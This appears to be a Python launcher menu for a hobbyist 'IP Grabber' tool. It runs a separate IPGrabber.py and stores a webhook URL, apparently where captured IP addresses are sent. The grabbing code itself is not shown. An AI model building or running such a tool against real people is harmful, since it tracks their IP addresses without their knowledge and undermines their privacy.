# Author: wingsscripts
version = "1.0.4"

import subprocess

ascii_art = r"""
 ___       __   ___  ________   ________  _______   ________  _________  ________  ________  ___       ________      
|\  \     |\  \|\  \|\   ___  \|\   ____\|\  ___ \ |\   __  \|\___   ___\\   __  \|\   __  \|\  \     |\   ____\     
\ \  \    \ \  \ \  \ \  \\ \  \ \  \___|\ \   __/|\ \  \|\  \|___ \  \_\ \  \|\  \ \  \|\  \ \  \    \ \  \___|_    
 \ \  \  __\ \  \ \  \ \  \\ \  \ \  \  __\ \  \_|/_\ \   _  _\   \ \  \ \ \  \\\  \ \  \\\  \ \  \    \ \_____  \   
  \ \  \|\__\_\  \ \  \ \  \\ \  \ \  \|\  \ \  \_|\ \ \  \\  \|   \ \  \ \ \  \\\  \ \  \\\  \ \  \____\|____|\  \  
   \ \____________\ \__\ \__\\ \__\ \_______\ \_______\ \__\\ _\    \ \__\ \ \_______\ \_______\ \_______\____\_\  \ 
    \|____________|\|__|\|__| \|__|\|_______|\|_______|\|__|\|__|    \|__|  \|_______|\|_______|\|_______|\_________\
                                                                                                         \|_________|

"""

def show_help():
    print("[1] What do you need help with?")
    print("[2] How to run IPGrabber.py?")
    print("[3] How to change webhook URL?")

def start():
    print("")
    print("[0] Help")
    print("Choose option: ")
    print("[1] Test IP Grabber")
    print("[2] Change Webhook URL")
    print("[3] Exit")
    try:
        chooseOption = int(input(""))
    except ValueError:
        print("Invalid input. Please enter a number.")
        return start()

    if chooseOption == 1:
        try:
            subprocess.run(["python", "IPGrabber.py"], check=True)
        except subprocess.CalledProcessError as e:
            print(f"An error occurred while running IPGrabber.py: {e}")
        start()
    elif chooseOption == 2:
        new_webhook = input("Enter new webhook URL: ")
        try:
            with open("webhook.txt", "w") as f:
                f.write(new_webhook)
            print("Webhook URL updated successfully.")
        except Exception as e:
            print(f"An error occurred while updating the webhook URL: {e}")
        start()
    elif chooseOption == 3:
        print("Exiting the program.")
    elif chooseOption == 0:
        show_help()
        start()
    else:
        print("Invalid option. Please try again.")
        start()

print(ascii_art)
start()